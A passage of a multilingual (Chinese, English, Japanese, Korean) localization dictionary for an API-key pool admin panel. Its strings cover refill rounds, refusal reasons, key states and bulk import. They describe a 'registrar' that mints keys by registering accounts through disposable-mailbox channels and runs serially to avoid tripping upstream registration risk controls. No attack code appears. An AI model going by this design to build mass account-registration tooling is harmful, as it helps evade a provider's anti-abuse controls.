**三个字段合读**才分得清。\n  \"reg.row.skipped\":  { \"zh-CN\": \"注册机当时是关闭的，这一轮什么都没做\", \"zh-TW\": \"註冊機當時是關閉的，這一輪什麼都沒做\", en: \"The registrar was off at the time; this round did nothing\", ja: \"その時点でレジストラーは無効でした。このラウンドは何もしていません\", ko: \"그 시점에 등록기가 꺼져 있었고 이 라운드는 아무것도 하지 않았습니다\" },\n  \"reg.row.healthy\":  { \"zh-CN\": \"池子已经够用，这一轮不需要铸 key\", \"zh-TW\": \"池子已經夠用，這一輪不需要鑄 key\", en: \"The pool was already full enough; no key needed minting this round\", ja: \"プールは十分だったため、このラウンドでは key を発行していません\", ko: \"풀이 이미 충분해 이 라운드에서는 key를 발급하지 않았습니다\" },\n  \"reg.row.noAttempt\": { \"zh-CN\": \"这一轮一次尝试都没开始（不是「跑完了没产出」）\", \"zh-TW\": \"這一輪一次嘗試都沒開始（不是「跑完了沒產出」）\", en: \"This round never started a single attempt (not \\\"ran and produced nothing\\\")\", ja: \"このラウンドは 1 回も試行を開始していません（「実行したが成果ゼロ」ではありません）\", ko: \"이 라운드는 시도를 한 번도 시작하지 않았습니다(「실행했지만 성과 없음」이 아닙니다)\" },\n  \"reg.row.minted\":   { \"zh-CN\": \"铸出 {minted} / 尝试 {attempted}\", \"zh-TW\": \"鑄出 {minted} / 嘗試 {attempted}\", en: \"{minted} minted / {attempted} attempted\", ja: \"発行 {minted} / 試行 {attempted}\", ko: \"발급 {minted} / 시도 {attempted}\" },\n  \"reg.row.unreadable\": { \"zh-CN\": \"这一行读不得\", \"zh-TW\": \"這一行讀不得\", en: \"This row is unreadable\", ja: \"この行は読み取れません\", ko: \"이 행은 읽을 수 없습니다\" },\n  // ⚠️ 逐通道铸出数**必须显示**：`minted` 只有总数，一轮全靠备通道铸出来时，\n  // 总数记在哪条通道名下是看不出来的——没有这一格，备通道的战绩会被持续记到\n  // 主通道头上，与「两条通道完全平级」正面冲突。\n  \"reg.row.byChannel\": { \"zh-CN\": \"逐通道：{detail}\", \"zh-TW\": \"逐通道：{detail}\", en: \"By channel: {detail}\", ja: \"チャネル別: {detail}\", ko: \"채널별: {detail}\" },\n  \"reg.fail.unknownReason\": { \"zh-CN\": \"这个版本的面板不认识的失败归因：{reason}\", \"zh-TW\": \"這個版本的面板不認識的失敗歸因：{reason}\", en: \"A failure reason this panel build does not know: {reason}\", ja: \"このパネルのビルドが認識できない失敗理由: {reason}\", ko: \"이 패널 빌드가 알지 못하는 실패 원인: {reason}\" },\n\n  // ── 后端拒绝的八种 reason，各自一句五语言（P3c Task 6）────────────────────\n  //\n  // ⚠️⚠️ **状态码不是判据，`reason` 才是。** `409` 有三种、`429` 有两种，\n  // 而它们的处置毫无共同之处。逐条的语义差别必须在文案里体现出来，尤其：\n  // · `tend_in_flight`（**这个**副本在跑：等一会儿）与 `locked`（**另一个**副本在跑：\n  //   说明你是多副本部署，不是你点错了）；\n  // · `write_budget_exhausted` **不许写成「太频繁」**——它挡的是**存储写配额**、\n  //   不是邮箱名额，而运维看到「太频繁」的第一反应是等一等，正确处置却是等到\n  //   UTC 零点或者调 MANUAL_TENDS_PER_DAY。\n  \"reg.refuse.tend_in_flight\": { \"zh-CN\": \"这个副本上已经有一轮补池在跑，等它结束就能再点。\", \"zh-TW\": \"這個副本上已經有一輪補池在跑，等它結束就能再點。\", en: \"This replica already has a refill round in flight; you can click again once it finishes.\", ja: \"このレプリカでは補充ラウンドがすでに実行中です。終了すれば再度実行できます。\", ko: \"이 복제본에서 이미 보충 라운드가 실행 중입니다. 끝나면 다시 누를 수 있습니다.\" },\n  \"reg.refuse.locked\":          { \"zh-CN\": \"另一个副本正在补池，本次没有启动。补池是顺序执行的：并发会同时撞邮箱建号限流与上游注册风控。\", \"zh-TW\": \"另一個副本正在補池，本次沒有啟動。補池是順序執行的：並發會同時撞郵箱建號限流與上游註冊風控。\", en: \"Another replica is refilling, so this run did not start. Refills run one at a time: concurrent rounds hit both the mailbox creation rate limit and the upstream registration risk controls.\", ja: \"別のレプリカが補充中のため、今回は開始しませんでした。補充は逐次実行です: 同時に走らせるとメールボックス作成のレート制限と上流の登録リスク制御の両方に当たります。\", ko: \"다른 복제본이 보충 중이어서 이번에는 시작하지 않았습니다. 보충은 순차 실행입니다: 동시에 돌리면 메일박스 생성 속도 제한과 업스트림 가입 위험 관리에 모두 걸립니다.\" },\n  \"reg.refuse.registrar_disabled\": { \"zh-CN\": \"注册机没有打开，没有可补的池。请先在设置里打开它，并配好至少一条邮箱通道。\", \"zh-TW\": \"註冊機沒有打開，沒有可補的池。請先在設定裡打開它，並配好至少一條郵箱通道。\", en: \"The registrar is not turned on, so there is nothing to refill. Turn it on in Settings and configure at least one mailbox channel first.\", ja: \"レジストラーが有効になっていないため、補充する対象がありません。まず設定で有効にし、メールボックスチャネルを少なくとも 1 つ構成してください。\", ko: \"등록기가 켜져 있지 않아 보충할 대상이 없습니다. 먼저 설정에서 켜고 메일박스 채널을 최소 하나 구성하세요.\" },\n  \"reg.refuse.write_budget_exhausted\": { \"zh-CN\": \"今天的手动补池次数已经用完。这道闸挡的是存储写配额，不是邮箱名额——等到重置时刻会自动恢复，也可以调大 MANUAL_TENDS_PER_DAY。\", \"zh-TW\": \"今天的手動補池次數已經用完。這道閘擋的是儲存寫配額，不是郵箱名額——等到重置時刻會自動恢復，也可以調大 MANUAL_TENDS_PER_DAY。\", en: \"Today's manual refill allowance is used up. This gate protects the storage write quota, not the mailbox allowance — it restores itself at the reset time, or you can raise MANUAL_TENDS_PER_DAY.\", ja: \"本日の手動補充回数を使い切りました。このゲートが守っているのはストレージの書き込み割り当てであり、メールボックスの枠ではありません——リセット時刻に自動で回復します。MANUAL_TENDS_PER_DAY を大きくすることもできます。\", ko: \"오늘의 수동 보충 횟수를 모두 사용했습니다. 이 게이트가 지키는 것은 스토리지 쓰기 할당량이지 메일박스 정원이 아닙니다 — 초기화 시각에 자동으로 회복되며, MANUAL_TENDS_PER_DAY를 늘릴 수도 있습니다.\" },\n  \"reg.refuse.manual_cooldown\": { \"zh-CN\": \"两次手动补池之间要隔一段冷却时间，还没到。\", \"zh-TW\": \"兩次手動補池之間要隔一段冷卻時間，還沒到。\", en: \"Two manual refills must be spaced apart by a cooldown, and it has not elapsed yet.\", ja: \"手動補充どうしの間にはクールダウンが必要で、まだ経過していません。\", ko: \"수동 보충 사이에는 쿨다운이 필요하며 아직 지나지 않았습니다.\" },\n  \"reg.refuse.not_wired\":      { \"zh-CN\": \"这个部署没有接上注册机的执行体，读不到补池记录也补不了池。这是装配问题，不是运行状态——正常经容器 / Worker 入口启动的部署不会出现。\", \"zh-TW\": \"這個部署沒有接上註冊機的執行體，讀不到補池記錄也補不了池。這是裝配問題，不是執行狀態——正常經容器 / Worker 入口啟動的部署不會出現。\", en: \"This deployment has no registrar executor wired in, so it can neither read refill records nor refill. That is an assembly problem, not a runtime state — it cannot happen for deployments started through the container or Worker entry point.\", ja: \"このデプロイにはレジストラーの実行体が接続されていないため、補充記録を読むことも補充することもできません。これは組み立ての問題であり実行時の状態ではありません——コンテナや Worker のエントリーポイント経由で起動したデプロイでは発生しません。\", ko: \"이 배포에는 등록기 실행체가 연결되어 있지 않아 보충 기록을 읽을 수도, 보충할 수도 없습니다. 이는 조립 문제이지 실행 상태가 아닙니다 — 컨테이너나 Worker 진입점으로 기동한 배포에서는 발생하지 않습니다.\" },\n  \"reg.refuse.unknown_channel\": { \"zh-CN\": \"通道名不认识，只能是 moemail 或 yyds。\", \"zh-TW\": \"通道名不認識，只能是 moemail 或 yyds。\", en: \"Unknown channel name; it can only be moemail or yyds.\", ja: \"チャネル名が不明です。moemail か yyds のいずれかである必要があります。\", ko: \"알 수 없는 채널 이름입니다. moemail 또는 yyds만 가능합니다.\" },\n  \"reg.refuse.channel_not_configured\": { \"zh-CN\": \"这条通道在本次部署里没有配好凭据，用不了。请先在设置里把它配上。\", \"zh-TW\": \"這條通道在本次部署裡沒有配好憑證，用不了。請先在設定裡把它配上。\", en: \"This channel has no credentials configured in this deployment, so it cannot be used. Configure it in Settings first.\", ja: \"このチャネルはこのデプロイで資格情報が設定されていないため使用できません。まず設定で構成してください。\", ko: \"이 채널은 이 배포에 자격 증명이 설정되어 있지 않아 사용할 수 없습니다. 먼저 설정에서 구성하세요.\" },\n  \"reg.refuse.probe_in_flight\": { \"zh-CN\": \"上一次探测还没有返回，等它结束再试（这颗按钮每按一次都会真的向邮箱服务发一次请求）。\", \"zh-TW\": \"上一次探測還沒有回來，等它結束再試（這顆按鈕每按一次都會真的向郵箱服務發一次請求）。\", en: \"The previous probe has not returned yet; wait for it to finish before retrying (each click really does send a request to the mailbox service).\", ja: \"前回のプローブがまだ返っていません。終了してから再試行してください（このボタンは押すたびにメールサービスへ実際にリクエストを送ります）。\", ko: \"이전 탐지가 아직 반환되지 않았습니다. 끝난 뒤에 다시 시도하세요(이 버튼은 누를 때마다 메일 서비스로 실제 요청을 보냅니다).\" },\n  \"reg.refuse.probe_cooldown\": { \"zh-CN\": \"两次探测之间至少要隔一小段时间，请稍后再试。这不是通道故障。\", \"zh-TW\": \"兩次探測之間至少要隔一小段時間，請稍後再試。這不是通道故障。\", en: \"There is a minimum interval between two probes; please retry shortly. This is not a channel failure.\", ja: \"プローブとプローブの間には最小間隔があります。少し待ってから再試行してください。チャネルの障害ではありません。\", ko: \"탐지와 탐지 사이에는 최소 간격이 있습니다. 잠시 후 다시 시도하세요. 채널 장애가 아닙니다.\" },\n\n  // ── Key 池板块（只读部分，Task 4）─────────────────────────────────────────\n  \"keys.title\":       { \"zh-CN\": \"Key 池\", \"zh-TW\": \"Key 池\", en: \"Key pool\", ja: \"キープール\", ko: \"키 풀\" },\n  \"keys.search\":      { \"zh-CN\": \"搜索 id 或掩码\", \"zh-TW\": \"搜尋 id 或遮罩\", en: \"Search by id or masked key\", ja: \"id またはマスクで検索\", ko: \"id 또는 마스크로 검색\" },\n  \"keys.filter\":      { \"zh-CN\": \"按状态筛选\", \"zh-TW\": \"依狀態篩選\", en: \"Filter by state\", ja: \"状態で絞り込み\", ko: \"상태로 필터\" },\n  \"keys.auto\":        { \"zh-CN\": \"自动刷新\", \"zh-TW\": \"自動重新整理\", en: \"Auto refresh\", ja: \"自動更新\", ko: \"자동 새로고침\" },\n  \"keys.auto.off\":    { \"zh-CN\": \"关\", \"zh-TW\": \"關\", en: \"Off\", ja: \"オフ\", ko: \"끄기\" },\n  \"keys.auto.30\":     { \"zh-CN\": \"30 秒\", \"zh-TW\": \"30 秒\", en: \"30s\", ja: \"30 秒\", ko: \"30초\" },\n  \"keys.auto.60\":     { \"zh-CN\": \"60 秒\", \"zh-TW\": \"60 秒\", en: \"60s\", ja: \"60 秒\", ko: \"60초\" },\n  // 开销说明**如实写**，不抄一个吓人的估算数字：这个板块与转发共用同一份 isolate\n  // 快照，P3b 的形态下自动刷新确实不烧存储配额。\n  //\n  // ⚠️ **carry-forward（Task 4 → Task 5）**：`{ttl}` / `{touch}` / `{poolTtl}` 三个\n  // 占位符在 Task 4 交付时没有数据源（capabilities/overview 是 Task 5 才有的），\n  // 当时暂用「点名旋钮 + 括注默认值」。Task 5 拿到 `GET /admin/api/overview` 之后\n  // 已把它们换成真实生效值——由 `js/pure/overview.mjs` 的 `poolKnobs()` 统一取数\n  // （两个板块共用同一份，不许各写各的），点名旋钮的写法保留（运维要知道该改哪个\n  // 环境变量），括注的默认值换成当前生效值。\n  \"keys.autoNote\":    { \"zh-CN\": \"这个板块与网关转发共用同一份 isolate 内的池子快照，所以自动刷新不额外产生存储读写。你看到的数据最多晚一个 POOL_CACHE_TTL_MS（当前 {ttl}）。\", \"zh-TW\": \"這個板塊與網關轉發共用同一份 isolate 內的池子快照，所以自動重新整理不額外產生儲存讀寫。你看到的資料最多晚一個 POOL_CACHE_TTL_MS（目前 {ttl}）。\", en: \"This section shares the same in-isolate pool snapshot as request forwarding, so auto refresh costs no extra storage reads or writes. What you see can lag by up to one POOL_CACHE_TTL_MS (currently {ttl}).\", ja: \"このセクションはゲートウェイの転送と同じ isolate 内プールスナップショットを共有するため、自動更新でストレージの読み書きが増えることはありません。表示は最大で POOL_CACHE_TTL_MS ぶん（現在の値: {ttl}）遅れることがあります。\", ko: \"이 섹션은 게이트웨이 전달과 동일한 isolate 내 풀 스냅숏을 공유하므로 자동 새로고침이 스토리지 읽기/쓰기를 추가로 발생시키지 않습니다. 보이는 데이터는 최대 POOL_CACHE_TTL_MS(현재 값 {ttl})만큼 늦을 수 있습니다.\" },\n  // 新鲜度提示条：与概览页共用同一份文案（组织方式不同——概览页的 ov.freshness.pool\n  // 还多了 configTtl 那一半，键池板块本来就没有配置卡，只留池子那一半）。\n  //\n  // ⚠️ **P3b 待办第 4 条的收尾**：`{edge}` 原来是硬编码的「约 60 秒」，现在与\n  // `ov.freshness.pool` 一样由响应的 `kvEdgeCacheMs` 驱动（两个板块共用\n  // `pure/overview.mjs` 的 `poolKnobs()` 取同一个数字，见该函数的说明）。\n  \"keys.freshness\":   { \"zh-CN\": \"别的实例判定的冷却 / 剔除，这里最多晚 {poolTtl} + {edge}（KV 边缘缓存）才看到；而且这个窗口里本实例的写会覆盖对方刚写下的调度状态。\", \"zh-TW\": \"別的實例判定的冷卻 / 剔除，這裡最多晚 {poolTtl} + {edge}（KV 邊緣快取）才看得到；而且這個視窗裡本實例的寫入會覆蓋對方剛寫下的排程狀態。\", en: \"Cooldowns and evictions decided by another instance take up to {poolTtl} plus {edge} (KV edge cache) to show up here. Within that window, writes from this instance also overwrite the scheduling state the other one just wrote.\", ja: \"他のインスタンスが判定したクールダウン／除外がここに反映されるまで、最大で {poolTtl} + {edge}（KV のエッジキャッシュ）かかります。しかもその間、このインスタンスの書き込みは相手が書いたばかりのスケジューリング状態を上書きします。\", ko: \"다른 인스턴스가 판정한 쿨다운/제외가 여기에 보이기까지 최대 {poolTtl} + {edge}(KV 엣지 캐시)가 걸립니다. 게다가 그 구간에서는 이 인스턴스의 쓰기가 상대가 방금 기록한 스케줄링 상태를 덮어씁니다.\" },\n  \"keys.approxTip\":   { \"zh-CN\": \"近似值：并发请求下会少计（KV 没有 CAS）；且计数最多晚一个 POOL_TOUCH_INTERVAL_MS（当前 {touch}）才落盘，isolate 在此之前被回收时这一段会丢。\", \"zh-TW\": \"近似值：並發請求下會少計（KV 沒有 CAS）；且計數最多晚一個 POOL_TOUCH_INTERVAL_MS（目前 {touch}）才寫入，isolate 在此之前被回收時這一段會遺失。\", en: \"Approximate: concurrent requests undercount it (KV has no CAS), and counters are persisted up to one POOL_TOUCH_INTERVAL_MS late (currently {touch}) — whatever has not been persisted is lost if the isolate is recycled first.\", ja: \"概算値: 同時リクエスト下では少なく数えられます（KV に CAS がないため）。またカウンターの永続化は最大で POOL_TOUCH_INTERVAL_MS ぶん（現在の値: {touch}）遅れ、その前に isolate が回収されるとその分は失われます。\", ko: \"근사값: 동시 요청에서는 적게 집계됩니다(KV에 CAS가 없음). 또한 카운터는 최대 POOL_TOUCH_INTERVAL_MS(현재 값 {touch})만큼 늦게 저장되며, 그 전에 isolate가 회수되면 그 구간은 사라집니다.\" },\n  // 「最后使用」与计数是**同一份** staleness（同一次落盘一起带下去），所以它同样打 ≈。\n  // 这条与 keys.approxTip 说的不是一句话：那条讲「少计 + 晚落盘」，这条讲「时刻本身粗」。\n  \"keys.approxLastUsedTip\": { \"zh-CN\": \"近似值：这一列的精度最粗到一个 POOL_TOUCH_INTERVAL_MS（当前 {touch}）——写消除会把「只更新了最后使用时间」的那次写整个丢掉。任何其他状态变更的落盘都会顺带把它刷新，所以真出故障时它反而是新的。\", \"zh-TW\": \"近似值：這一欄的精度最粗到一個 POOL_TOUCH_INTERVAL_MS（目前 {touch}）——寫入消除會把「只更新了最後使用時間」的那次寫入整個丟掉。任何其他狀態變更的寫入都會順帶刷新它，所以真出故障時它反而是新的。\", en: \"Approximate: this column is only as precise as one POOL_TOUCH_INTERVAL_MS (currently {touch}) — a write that only bumps the last-used time is dropped entirely. Any other state change persists it as a side effect, so it is actually fresh whenever something is going wrong.\", ja: \"概算値: この列の精度は最も粗い場合で POOL_TOUCH_INTERVAL_MS ぶん（現在の値: {touch}）です——「最終使用時刻だけが変わった」書き込みは丸ごと破棄されます。他の状態変更の永続化はこの値もついでに更新するため、障害が起きているときはむしろ新しい値になります。\", ko: \"근사값: 이 열의 정밀도는 최대 POOL_TOUCH_INTERVAL_MS(현재 값 {touch})까지 거칠어집니다 — 마지막 사용 시각만 바뀐 쓰기는 통째로 버려지기 때문입니다. 다른 상태 변경이 저장될 때 함께 갱신되므로, 실제로 문제가 생겼을 때는 오히려 최신입니다.\" },\n  \"keys.bucket.all\":     { \"zh-CN\": \"全部\", \"zh-TW\": \"全部\", en: \"All\", ja: \"すべて\", ko: \"전체\" },\n  \"keys.bucket.fresh\":   { \"zh-CN\": \"可用\", \"zh-TW\": \"可用\", en: \"Available\", ja: \"利用可能\", ko: \"사용 가능\" },\n  \"keys.bucket.cooling\": { \"zh-CN\": \"冷却中\", \"zh-TW\": \"冷卻中\", en: \"Cooling down\", ja: \"クールダウン中\", ko: \"쿨다운 중\" },\n  \"keys.bucket.evicted\": { \"zh-CN\": \"已剔除\", \"zh-TW\": \"已剔除\", en: \"Evicted\", ja: \"除外済み\", ko: \"제외됨\" },\n  \"keys.bucket.disabled\": { \"zh-CN\": \"已停用\", \"zh-TW\": \"已停用\", en: \"Disabled\", ja: \"無効化済み\", ko: \"비활성화됨\" },\n  \"keys.col.seq\":        { \"zh-CN\": \"#\", \"zh-TW\": \"#\", en: \"#\", ja: \"#\", ko: \"#\" },\n  \"keys.col.key\":        { \"zh-CN\": \"Key\", \"zh-TW\": \"Key\", en: \"Key\", ja: \"Key\", ko: \"Key\" },\n  \"keys.col.bucket\":     { \"zh-CN\": \"状态\", \"zh-TW\": \"狀態\", en: \"State\", ja: \"状態\", ko: \"상태\" },\n  \"keys.col.addedAt\":    { \"zh-CN\": \"加入时间\", \"zh-TW\": \"加入時間\", en: \"Added\", ja: \"追加日時\", ko: \"추가 시각\" },\n  \"keys.col.lastUsedAt\": { \"zh-CN\": \"最后使用\", \"zh-TW\": \"最後使用\", en: \"Last used\", ja: \"最終使用\", ko: \"마지막 사용\" },\n  \"keys.col.cooldown\":   { \"zh-CN\": \"冷却剩余\", \"zh-TW\": \"冷卻剩餘\", en: \"Cooldown left\", ja: \"クールダウン残り\", ko: \"쿨다운 잔여\" },\n  \"keys.col.strikes\":    { \"zh-CN\": \"连续失败\", \"zh-TW\": \"連續失敗\", en: \"Strikes\", ja: \"連続失敗\", ko: \"연속 실패\" },\n  \"keys.col.usage\":      { \"zh-CN\": \"请求数 · 成功率\", \"zh-TW\": \"請求數 · 成功率\", en: \"Requests · success rate\", ja: \"リクエスト数 · 成功率\", ko: \"요청 수 · 성공률\" },\n  \"keys.col.lastError\":  { \"zh-CN\": \"最近错误\", \"zh-TW\": \"最近錯誤\", en: \"Last error\", ja: \"直近のエラー\", ko: \"최근 오류\" },\n  \"keys.empty\":       { \"zh-CN\": \"池子里还没有 key\", \"zh-TW\": \"池子裡還沒有 key\", en: \"No keys in the pool yet\", ja: \"プールにまだ key がありません\", ko: \"풀에 아직 key가 없습니다\" },\n  \"keys.noMatch\":     { \"zh-CN\": \"没有符合条件的 key\", \"zh-TW\": \"沒有符合條件的 key\", en: \"No keys match the current filter\", ja: \"条件に一致する key がありません\", ko: \"조건에 맞는 key가 없습니다\" },\n  \"keys.pageInfo\":    { \"zh-CN\": \"第 {page}/{pages} 页 · 共 {total} 条\", \"zh-TW\": \"第 {page}/{pages} 頁 · 共 {total} 筆\", en: \"Page {page} of {pages} · {total} in total\", ja: \"{pages} ページ中 {page} ページ目 · 全 {total} 件\", ko: \"{pages} 페이지 중 {page} 페이지 · 총 {total}개\" },\n  \"keys.prev\":        { \"zh-CN\": \"上一页\", \"zh-TW\": \"上一頁\", en: \"Previous\", ja: \"前へ\", ko: \"이전\" },\n  \"keys.next\":        { \"zh-CN\": \"下一页\", \"zh-TW\": \"下一頁\", en: \"Next\", ja: \"次へ\", ko: \"다음\" },\n\n  // ── Key 池板块：写操作（P3c Task 4）─────────────────────────────────────────\n  // 行内动作列。**停用/启用/清冷却/清连续失败/解除剔除/删除**，与后端\n  // `PATCH /admin/api/keys/:id` 支持的五个字段逐一对应（见下面 `keys.action.clearStrikes`\n  // 那条注释——它是控制端追加裁定补的，简报第一版的动作清单漏列了它）。\n  \"keys.action.disable\":      { \"zh-CN\": \"停用\", \"zh-TW\": \"停用\", en: \"Disable\", ja: \"無効化\", ko: \"정지\" },\n  \"keys.action.enable\":       { \"zh-CN\": \"启用\", \"zh-TW\": \"啟用\", en: \"Enable\", ja: \"有効化\", ko: \"활성화\" },\n  \"keys.action.clearCooldown\":{ \"zh-CN\": \"清冷却\", \"zh-TW\": \"清冷卻\", en: \"Clear cooldown\", ja: \"クールダウン解除\", ko: \"쿨다운 해제\" },\n  // ⚠️ 控制端追加裁定（评审前）：设计 §10.2 的行内动作清单本来就有「清 strikes」，\n  // 后端 PATCH 的 clearStrikes 字段 Task 3 也已经实现全，是简报的动作清单第一版\n  // 漏列了它——补的是遗漏，不是新范围。命名跟着 keys.col.strikes（「连续失败」）\n  // 走，不叫「清 strikes」：面板上不该出现只有开发者认得的英文字段名。\n  \"keys.action.clearStrikes\": { \"zh-CN\": \"清连续失败\", \"zh-TW\": \"清連續失敗\", en: \"Clear strikes\", ja: \"連続失敗をクリア\", ko: \"연속 실패 초기화\" },\n  \"keys.action.unevict\":      { \"zh-CN\": \"解除剔除\", \"zh-TW\": \"解除剔除\", en: \"Unevict\", ja: \"除外解除\", ko: \"제외 해제\" },\n  \"keys.action.note\":         { \"zh-CN\": \"备注\", \"zh-TW\": \"備註\", en: \"Note\", ja: \"備考\", ko: \"비고\" },\n  \"keys.action.delete\":       { \"zh-CN\": \"删除\", \"zh-TW\": \"刪除\", en: \"Delete\", ja: \"削除\", ko: \"삭제\" },\n  \"keys.col.note\":            { \"zh-CN\": \"备注\", \"zh-TW\": \"備註\", en: \"Note\", ja: \"備考\", ko: \"비고\" },\n  \"keys.col.actions\":         { \"zh-CN\": \"操作\", \"zh-TW\": \"操作\", en: \"Actions\", ja: \"操作\", ko: \"작업\" },\n\n  // 批量选择：**全选只选当前页**（照抄 kiro2api 的安全约束，设计 §10.2：\n  // 一键选中一千个看不见的行再批量删除，后果不可挽回）。判据在\n  // `js/pure/keys-write.mjs` 的 `selectAllIds()`。\n  \"keys.selectAll\":  { \"zh-CN\": \"全选本页\", \"zh-TW\": \"全選本頁\", en: \"Select all on this page\", ja: \"このページを全選択\", ko: \"이 페이지 전체 선택\" },\n  \"keys.selectRow\":  { \"zh-CN\": \"选择这一行\", \"zh-TW\": \"選擇這一行\", en: \"Select this row\", ja: \"この行を選択\", ko: \"이 행 선택\" },\n  \"keys.bulk.selectedCount\": { \"zh-CN\": \"已选中 {count} 把\", \"zh-TW\": \"已選中 {count} 把\", en: \"{count} selected\", ja: \"{count} 件選択中\", ko: \"{count}개 선택됨\" },\n  \"keys.bulk.disable\":        { \"zh-CN\": \"批量停用\", \"zh-TW\": \"批量停用\", en: \"Bulk disable\", ja: \"一括無効化\", ko: \"일괄 정지\" },\n  \"keys.bulk.clearCooldown\":  { \"zh-CN\": \"批量清冷却\", \"zh-TW\": \"批量清冷卻\", en: \"Bulk clear cooldown\", ja: \"一括クールダウン解除\", ko: \"일괄 쿨다운 해제\" },\n  \"keys.bulk.delete\":         { \"zh-CN\": \"批量删除\", \"zh-TW\": \"批量刪除\", en: \"Bulk delete\", ja: \"一括削除\", ko: \"일괄 삭제\" },\n  \"keys.bulk.confirmTitle\":   { \"zh-CN\": \"确认批量操作\", \"zh-TW\": \"確認批次操作\", en: \"Confirm bulk action\", ja: \"一括操作の確認\", ko: \"일괄 작업 확인\" },\n  \"keys.bulk.confirmDelete\":  { \"zh-CN\": \"确定要删除选中的 {count} 把 key 吗？此操作不可撤销。\", \"zh-TW\": \"確定要刪除選中的 {count} 把 key 嗎？此操作不可復原。\", en: \"Delete the selected {count} key(s)? This cannot be undone.\", ja: \"選択した {count} 件の key を削除しますか？この操作は取り消せません。\", ko: \"선택한 key {count}개를 삭제하시겠습니까? 이 작업은 되돌릴 수 없습니다.\" },\n\n  // 批量结果提示。⚠️⚠️ **`keys.bulk.allOk` / `keys.bulk.partial` 刻意不带占位符**：\n  // `js/pure/keys-write.mjs` 的 `bulkResultKey()` 把它们当裸字符串 `return`，\n  // 若这两个 key 带 `{}` 占位符，`scripts/check-i18n.mjs` 第 ⑧ 条会在那一行报错\n  // （字面量后面跟的是 `;` 不是 `,`）。实际的数字由 `keys.bulk.countsSuffix` /\n  // `mustDisableFirstSuffix` / `notFoundSuffix` 三个**始终带参数调用**的 key 承载\n  // ——**「批量里有 3 把被拒、前端必须显示出来」这条判据落在这三个 key 上**。\n  \"keys.bulk.allOk\":  { \"zh-CN\": \"批量操作已完成：全部成功。\", \"zh-TW\": \"批次操作已完成：全部成功。\", en: \"Bulk action completed: all succeeded.\", ja: \"一括操作が完了しました：すべて成功しました。\", ko: \"일괄 작업 완료: 모두 성공했습니다.\" },\n  \"keys.bulk.partial\":{ \"zh-CN\": \"批量操作已完成，但不是全部成功。\", \"zh-TW\": \"批次操作已完成，但不是全部成功。\", en: \"Bulk action completed, but not all succeeded.\", ja: \"一括操作は完了しましたが、すべては成功していません。\", ko: \"일괄 작업이 완료되었지만 전부 성공하지는 않았습니다.\" },\n  \"keys.bulk.countsSuffix\":           { \"zh-CN\": \"（{ok}/{total} 把成功）\", \"zh-TW\": \"（{ok}/{total} 把成功）\", en: \" ({ok}/{total} succeeded)\", ja: \"（{ok}/{total} 件成功）\", ko: \" ({ok}/{total}개 성공)\" },\n  \"keys.bulk.mustDisableFirstSuffix\": { \"zh-CN\": \"；{mustDisableFirst} 把未停用/未剔除，需要先停用才能删除。\", \"zh-TW\": \"；{mustDisableFirst} 把未停用/未剔除，需要先停用才能刪除。\", en: \"; {mustDisableFirst} key(s) are neither disabled nor evicted and must be disabled before deletion.\", ja: \"；{mustDisableFirst} 件は無効化も除外もされていないため、削除には先に無効化が必要です。\", ko: \"; {mustDisableFirst}개는 정지되지도 제외되지도 않아 삭제 전에 먼저 정지해야 합니다.\" },\n  \"keys.bulk.notFoundSuffix\":         { \"zh-CN\": \"；{notFound} 把已经不存在。\", \"zh-TW\": \"；{notFound} 把已經不存在。\", en: \"; {notFound} key(s) no longer exist.\", ja: \"；{notFound} 件はすでに存在しません。\", ko: \"; {notFound}개는 이미 존재하지 않습니다.\" },\n\n  // 「添加 Key」分组下拉（设计 §10.2，控制端裁定现在就建容器）。\n  // 【自动注册】两项先占位禁用，留给 Task 6 接线到注册机端点；容器与两组\n  // 平级的结构现在定死，Task 6 只需要摘掉 disabled、接上真实 onClick。\n  \"keys.addMenu.open\":          { \"zh-CN\": \"添加 Key\", \"zh-TW\": \"新增 Key\", en: \"Add key\", ja: \"Key を追加\", ko: \"Key 추가\" },\n  \"keys.addMenu.autoGroup\":     { \"zh-CN\": \"自动注册\", \"zh-TW\": \"自動註冊\", en: \"Auto-register\", ja: \"自動登録\", ko: \"자동 등록\" },\n  \"keys.addMenu.autoMoemail\":   { \"zh-CN\": \"通过 MoeMail 通道立即补池\", \"zh-TW\": \"透過 MoeMail 通道立即補池\", en: \"Mint via the MoeMail channel now\", ja: \"MoeMail チャネルで今すぐ補充\", ko: \"MoeMail 채널로 즉시 보충\" },\n  \"keys.addMenu.autoYyds\":      { \"zh-CN\": \"通过 YYDS 通道立即补池\", \"zh-TW\": \"透過 YYDS 通道立即補池\", en: \"Mint via the YYDS channel now\", ja: \"YYDS チャネルで今すぐ補充\", ko: \"YYDS 채널로 즉시 보충\" },\n  // ⚠️ **`keys.addMenu.autoPlaceholder` 在 P3c Task 6 被删掉了，不是漏了。**\n  // 它是 Task 4 给【自动注册】那两项占位时用的 tooltip（「这个通道还没有接入本面板」），\n  // 本任务把两项真的接上了 ⇒ 那句话变成假话。**留一条零消费者的死文案比删掉它更贵**：\n  // check-i18n 只会把它报成一条警告，而下一个读字典的人会以为面板上还有这么一句提示。\n  \"keys.addMenu.manualGroup\":   { \"zh-CN\": \"手动\", \"zh-TW\": \"手動\", en: \"Manual\", ja: \"手動\", ko: \"수동\" },\n  \"keys.addMenu.pasteSingle\":   { \"zh-CN\": \"粘贴单个 Key\", \"zh-TW\": \"貼上單一 Key\", en: \"Paste a single key\", ja: \"単一の key を貼り付け\", ko: \"단일 key 붙여넣기\" },\n  // ⚠️ **不照抄设计原文\"批量导入（多行 / JSON 数组）\"**：导入框只按行拆\n  // （`js/pure/keys-write.mjs` 的 `importLines()`），不解析 JSON 数组——照抄那句\n  // 等于承诺一个没有实现的能力，粘一个 `[\"sk-a\",\"sk-b\"]` 进去只会得到\"不合法\n  // 的 key\"，不是两把导入成功的 key。这句话如实描述现在的行为。\n  \"keys.addMenu.bulkImport\":    { \"zh-CN\": \"批量导入（每行一把）\", \"zh-TW\": \"批量匯入（每行一把）\", en: \"Bulk import (one per line)\", ja: \"一括インポート（1 行に 1 つ）\", ko: \"일괄 가져오기(한 줄에 하나)\" },\n\n  // 导入弹窗。⚠️ **导入框必须原样按行发（空行也发）**：`js/pure/keys-write.mjs`\n  // 的 `importLines()` 与后端 `src/core/keypool-repo.ts` 的 `addMany()` 共用同一个\n  // 口径——位置（1 基）就是行号，前端先过滤空行会让报给运维的行号错位。\n  \"keys.import.title\":      { \"zh-CN\": \"批量导入 Key\", \"zh-TW\": \"批量匯入 Key\", en: \"Import keys\", ja: \"Key の一括インポート\", ko: \"Key 일괄 가져오기\" 